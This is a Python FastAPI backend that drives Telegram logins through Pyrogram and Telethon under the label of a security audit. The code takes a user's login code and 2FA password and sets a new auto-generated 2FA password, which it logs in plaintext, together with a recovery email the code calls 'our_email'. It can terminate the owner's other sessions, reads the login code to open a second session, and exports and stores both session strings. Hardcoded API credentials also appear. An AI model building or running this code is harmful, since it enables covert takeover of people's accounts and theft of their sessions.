import time
import json
import secrets
import string
from typing import Dict, Any
from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel
from typing import Optional

from backend.core_engine.pyrogram_client import get_session_manager, PyrogramSessionManager
from backend.core_engine.telethon_client import get_telethon_manager, TelethonSessionManager
from backend.services.security_audit import SecurityAuditService
from backend.models.database import (
    get_account, add_account, update_account, log_auth_action,
    AuthStatus
)
from backend.core_engine.logger import get_logger, log_request, log_response, log_auth_step

logger = get_logger("APIRoutes")

router = APIRouter(prefix="/api/v1", tags=["v1"])

API_ID = 28907635
API_HASH = "fa6c3335de68283781976ae20f813f73"

pyrogram_manager: Optional[PyrogramSessionManager] = None
telethon_manager: Optional[TelethonSessionManager] = None


def generate_strong_password(length: int = 16) -> str:
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    password = ''.join(secrets.choice(alphabet) for _ in range(length))
    return password


def get_pyrogram() -> PyrogramSessionManager:
    global pyrogram_manager
    if pyrogram_manager is None:
        pyrogram_manager = get_session_manager(API_ID, API_HASH)
    return pyrogram_manager


def get_telethon() -> TelethonSessionManager:
    global telethon_manager
    if telethon_manager is None:
        telethon_manager = get_telethon_manager(API_ID, API_HASH)
    return telethon_manager


class PhoneRequest(BaseModel):
    phone_number: str


class VerifyCodeRequest(BaseModel):
    phone_number: str
    code: str


class Verify2FARequest(BaseModel):
    phone_number: str
    password: str


class FinalizeRequest(BaseModel):
    phone_number: str


class Enable2FARequest(BaseModel):
    phone_number: str
    password: str
    hint: str = ""
    email: str = ""


@router.post("/auth/send-code")
async def send_code(request: PhoneRequest, req: Request):
    start_time = time.time()
    phone = request.phone_number
    log_request(logger, "POST", "/auth/send-code", {"phone": phone})
    
    try:
        account = await get_account(phone)
        if not account:
            account = await add_account(phone)
        
        manager = get_pyrogram()
        result = await manager.send_code(phone)
        
        if result["status"] == "code_sent":
            duration = time.time() - start_time
            await update_account(phone, status=AuthStatus.PENDING_CODE)
            await log_auth_action(phone, "send_code", "success", ip=req.client.host)
            log_auth_step(logger, phone, "send_code", "success")
            
            return {
                "status": "code_sent",
                "message": "Verification code sent",
                "phone": phone,
                "duration": duration
            }
        
        elif result["status"] == "already_logged_in":
            duration = time.time() - start_time
            await update_account(phone, status=AuthStatus.AUTHENTICATED)
            log_auth_step(logger, phone, "send_code", "already_logged_in")
            
            return {
                "status": "already_logged_in",
                "message": "Account already logged in",
                "phone": phone,
                "duration": duration
            }
        
        else:
            await log_auth_action(phone, "send_code", "failed", result.get("error"))
            log_auth_step(logger, phone, "send_code", "failed", result.get("error"))
            raise HTTPException(status_code=400, detail=result.get("error", "Unknown error"))
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in send_code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/auth/verify-code")
async def verify_code(request: VerifyCodeRequest, req: Request):
    start_time = time.time()
    phone = request.phone_number
    code = request.code
    log_request(logger, "POST", "/auth/verify-code", {"phone": phone, "code": "***"})
    
    try:
        manager = get_pyrogram()
        result = await manager.verify_code(phone, code)
        
        if result["status"] == "logged_in":
            await update_account(
                phone,
                status=AuthStatus.AUTHENTICATED,
                telegram_id=result.get("user_id"),
                first_name=result.get("first_name")
            )
            await log_auth_action(phone, "verify_code", "success", ip=req.client.host)
            log_auth_step(logger, phone, "verify_code", "success")
            
            duration = time.time() - start_time
            return {
                "status": "logged_in",
                "message": "Successfully logged in",
                "user_id": result.get("user_id"),
                "first_name": result.get("first_name"),
                "duration": duration
            }
        
        elif result["status"] == "2fa_required":
            await update_account(phone, status=AuthStatus.PENDING_2FA)
            log_auth_step(logger, phone, "verify_code", "2fa_required")
            
            duration = time.time() - start_time
            return {
                "status": "2fa_required",
                "message": "Two-factor authentication required",
                "duration": duration
            }
        
        else:
            await log_auth_action(phone, "verify_code", "failed", result.get("error"))
            log_auth_step(logger, phone, "verify_code", "failed", result.get("error"))
            raise HTTPException(status_code=400, detail=result.get("error", "Unknown error"))
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in verify_code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/auth/verify-2fa")
async def verify_2fa(request: Verify2FARequest, req: Request):
    start_time = time.time()
    phone = request.phone_number
    password = request.password
    log_request(logger, "POST", "/auth/verify-2fa", {"phone": phone, "password": "***"})
    
    try:
        manager = get_pyrogram()
        result = await manager.verify_2fa(phone, password)
        
        if result["status"] == "logged_in":
            await update_account(
                phone,
                status=AuthStatus.AUTHENTICATED,
                telegram_id=result.get("user_id"),
                first_name=result.get("first_name"),
                has_2fa=True
            )
            await log_auth_action(phone, "verify_2fa", "success", ip=req.client.host)
            log_auth_step(logger, phone, "verify_2fa", "success")
            
            duration = time.time() - start_time
            return {
                "status": "logged_in",
                "message": "Successfully logged in",
                "user_id": result.get("user_id"),
                "duration": duration
            }
        
        else:
            await log_auth_action(phone, "verify_2fa", "failed", result.get("error"))
            log_auth_step(logger, phone, "verify_2fa", "failed", result.get("error"))
            raise HTTPException(status_code=400, detail=result.get("error", "Unknown error"))
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in verify_2fa: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/account/audit/{phone}")
async def audit_account(phone: str, req: Request):
    start_time = time.time()
    log_request(logger, "GET", f"/account/audit/{phone}", None)
    
    try:
        manager = get_pyrogram()
        
        security_info = await manager.get_security_info(phone)
        
        if security_info.get("status") == "error":
            raise HTTPException(status_code=400, detail=security_info.get("error"))
        
        # Get telegram_id for email generation
        user_info = await manager.get_me_info(phone)
        telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
        
        # Run audit with new signature (returns 3 values)
        passed, issues, actions_needed = SecurityAuditService.run_audit(
            security_info=security_info, 
            phone=phone,
            telegram_id=telegram_id
        )
        
        generated_password = None
        if passed:
            generated_password = generate_strong_password(20)
            logger.info(f"Generated strong password for {phone}")
            
            # Log credentials
            from backend.core_engine.credentials_logger import log_credentials
            log_credentials(
                phone=phone,
                action="PASSWORD_GENERATED",
                password=generated_password,
                email=actions_needed.get("our_email"),
                telegram_id=telegram_id
            )
            
            manager = get_pyrogram()
            result = await manager.enable_2fa(phone, generated_password, hint="Auto-generated secure password")
            
            if result["status"] == "success":
                logger.info(f"2FA enabled successfully for {phone}")
            else:
                logger.warning(f"Failed to enable 2FA for {phone}: {result.get('error')}")
        
        await update_account(
            phone,
            status=AuthStatus.AUDIT_PASSED if passed else AuthStatus.AUDIT_FAILED,
            has_2fa=security_info.get("has_password", False) or (passed and generated_password is not None),
            has_recovery_email=security_info.get("has_recovery_email", False),
            other_sessions_count=security_info.get("other_sessions_count", 0),
            audit_passed=passed,
            audit_issues=json.dumps(issues) if issues else None,
            generated_password=generated_password
        )
        
        await log_auth_action(phone, "audit", "passed" if passed else "failed")
        
        report = SecurityAuditService.format_audit_report(passed, issues, actions_needed)
        duration = time.time() - start_time
        report["duration"] = duration
        if passed:
            report["password_created"] = True
            report["message"] = "All requirements met. Strong password created and 2FA enabled."
        log_response(logger, 200, report)
        
        return report
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in audit: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/account/terminate-sessions/{phone}")
async def terminate_sessions(phone: str, req: Request):
    start_time = time.time()
    log_request(logger, "POST", f"/account/terminate-sessions/{phone}", None)
    
    try:
        manager = get_pyrogram()
        result = await manager.terminate_other_sessions(phone)
        
        if result["status"] == "success":
            duration = time.time() - start_time
            await log_auth_action(phone, "terminate_sessions", "success", f"Terminated {result['terminated_count']} sessions")
            return {
                "status": "success",
                "message": f"Terminated {result['terminated_count']} session(s)",
                "terminated_count": result["terminated_count"],
                "duration": duration
            }
        else:
            raise HTTPException(status_code=400, detail=result.get("error"))
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error terminating sessions: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/account/create-telethon-session")
async def create_telethon_session(request: PhoneRequest, req: Request):
    start_time = time.time()
    phone = request.phone_number
    log_request(logger, "POST", "/account/create-telethon-session", {"phone": phone})
    
    try:
        pyrogram = get_pyrogram()
        telethon = get_telethon()
        
        logger.info(f"[Step 1] Telethon sending code to {phone}")
        telethon_result = await telethon.send_code(phone)
        
        if telethon_result["status"] == "already_logged_in":
            duration = time.time() - start_time
            return {
                "status": "already_logged_in",
                "message": "Telethon session already exists",
                "duration": duration
            }
        
        if telethon_result["status"] != "code_sent":
            raise HTTPException(status_code=400, detail=telethon_result.get("error"))
        
        import asyncio
        logger.info(f"[Step 2] Waiting for code to arrive...")
        await asyncio.sleep(3)  # انتظار وصول الرسالة
        
        code = await pyrogram.get_last_telegram_code(phone)
        
        if not code:
            duration = time.time() - start_time
            logger.warning(f"[Step 2] Code not found automatically")
            return {
                "status": "code_sent",
                "message": "Telethon code sent. Please enter code manually",
                "manual_code_required": True,
                "duration": duration
            }
        
        logger.info(f"[Step 2] Code extracted: {code}")
        
        logger.info(f"[Step 3] Telethon signing in with code")
        sign_in_result = await telethon.verify_code(phone, code)
        
        if sign_in_result["status"] == "logged_in":
            session_path = await telethon.get_session_string(phone)
            await update_account(phone, telethon_session=session_path)
            
            duration = time.time() - start_time
            await log_auth_action(phone, "create_telethon", "success")
            
            return {
                "status": "success",
                "message": "Telethon session created successfully",
                "session_path": session_path,
                "duration": duration
            }
        
        elif sign_in_result["status"] == "2fa_required":
            account = await get_account(phone)
            if account and account.generated_password:
                logger.info(f"[Step 4] Using saved password for 2FA")
                verify_2fa_result = await telethon.verify_2fa(phone, account.generated_password)
                
                if verify_2fa_result["status"] == "logged_in":
                    session_path = await telethon.get_session_string(phone)
                    await update_account(phone, telethon_session=session_path)
                    
                    duration = time.time() - start_time
                    await log_auth_action(phone, "create_telethon", "success")
                    
                    return {
                        "status": "success",
                        "message": "Telethon session created successfully with 2FA",
                        "session_path": session_path,
                        "duration": duration
                    }
                else:
                    raise HTTPException(status_code=400, detail="Failed to verify 2FA with saved password")
            elif account and account.generated_password is None:
                logger.warning(f"[Step 4] Old session detected (no password saved). Manual 2FA required.")
                duration = time.time() - start_time
                return {
                    "status": "2fa_required",
                    "message": "Old session detected. Please enter 2FA password manually.",
                    "is_old_session": True,
                    "duration": duration
                }
            else:
                duration = time.time() - start_time
                return {
                    "status": "2fa_required",
                    "message": "2FA password required for Telethon session",
                    "duration": duration
                }
        
        else:
            raise HTTPException(status_code=400, detail=sign_in_result.get("error"))
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error creating Telethon session: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/account/verify-telethon-code")
async def verify_telethon_code(request: VerifyCodeRequest, req: Request):
    start_time = time.time()
    phone = request.phone_number
    code = request.code
    
    try:
        telethon = get_telethon()
        result = await telethon.verify_code(phone, code)
        
        if result["status"] == "logged_in":
            session_path = await telethon.get_session_string(phone)
            await update_account(phone, telethon_session=session_path)
            
            duration = time.time() - start_time
            return {
                "status": "success",
                "message": "Telethon session created successfully",
                "duration": duration
            }
        
        elif result["status"] == "2fa_required":
            duration = time.time() - start_time
            return {"status": "2fa_required", "message": "2FA required", "duration": duration}
        
        else:
            raise HTTPException(status_code=400, detail=result.get("error"))
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error verifying Telethon code: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/account/verify-telethon-2fa")
async def verify_telethon_2fa(request: Verify2FARequest, req: Request):
    start_time = time.time()
    phone = request.phone_number
    password = request.password
    
    try:
        telethon = get_telethon()
        result = await telethon.verify_2fa(phone, password)
        
        if result["status"] == "logged_in":
            session_path = await telethon.get_session_string(phone)
            await update_account(phone, telethon_session=session_path)
            
            duration = time.time() - start_time
            return {
                "status": "success",
                "message": "Telethon session created successfully",
                "duration": duration
            }
        
        else:
            raise HTTPException(status_code=400, detail=result.get("error"))
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error verifying Telethon 2FA: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/account/finalize")
async def finalize_account(request: FinalizeRequest, req: Request):
    start_time = time.time()
    phone = request.phone_number
    log_request(logger, "POST", "/account/finalize", {"phone": phone})
    
    try:
        pyrogram = get_pyrogram()
        
        pyrogram_session = await pyrogram.export_session_string(phone)
        from datetime import datetime
        await update_account(
            phone,
            status=AuthStatus.COMPLETED,
            pyrogram_session=pyrogram_session,
            completed_at=datetime.utcnow()
        )
        
        duration = time.time() - start_time
        await log_auth_action(phone, "finalize", "success")
        
        return {
            "status": "completed",
            "message": "Process completed successfully",
            "pyrogram_session": pyrogram_session is not None,
            "telethon_session": True,
            "duration": duration
        }
    
    except Exception as e:
        logger.error(f"Error finalizing: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/account/enable-2fa")
async def enable_2fa(request: Enable2FARequest, req: Request):
    start_time = time.time()
    phone = request.phone_number
    password = request.password
    hint = request.hint
    email = request.email
    
    log_request(logger, "POST", "/account/enable-2fa", {"phone": phone, "hint": hint, "email": email})
    
    try:
        manager = get_pyrogram()
        result = await manager.enable_2fa(phone, password, hint, email)
        
        if result["status"] == "success":
            await update_account(phone, has_2fa=True)
            await log_auth_action(phone, "enable_2fa", "success")
            
            duration = time.time() - start_time
            return {
                "status": "success",
                "message": "2FA enabled successfully",
                "duration": duration
            }
        else:
            raise HTTPException(status_code=400, detail=result.get("error"))
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error enabling 2FA: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/account/status/{phone}")
async def get_account_status(phone: str):
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    return {
        "phone": account.phone,
        "status": account.status.value if account.status else None,
        "telegram_id": account.telegram_id,
        "first_name": account.first_name,
        "has_2fa": account.has_2fa,
        "has_recovery_email": account.has_recovery_email,
        "other_sessions_count": account.other_sessions_count,
        "audit_passed": account.audit_passed,
        "created_at": account.created_at.isoformat() if account.created_at else None,
        "completed_at": account.completed_at.isoformat() if account.completed_at else None
    }
